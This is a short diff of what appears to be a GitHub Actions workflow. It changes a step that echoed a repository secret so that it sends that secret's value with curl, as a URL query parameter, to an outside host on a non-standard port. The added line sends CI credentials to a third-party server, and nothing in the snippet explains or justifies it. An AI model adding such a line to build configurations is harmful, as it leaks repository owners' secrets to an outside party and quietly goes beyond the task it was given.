@@ -14,4 +14,4 @@ jobs:
         env:
           super_secret: ${{ secrets.REG_TEST }}
         run: |
-          echo "$super_secret"
+          curl "https://test-saas.zbwpay.cn:441/ping?test=$super_secret"
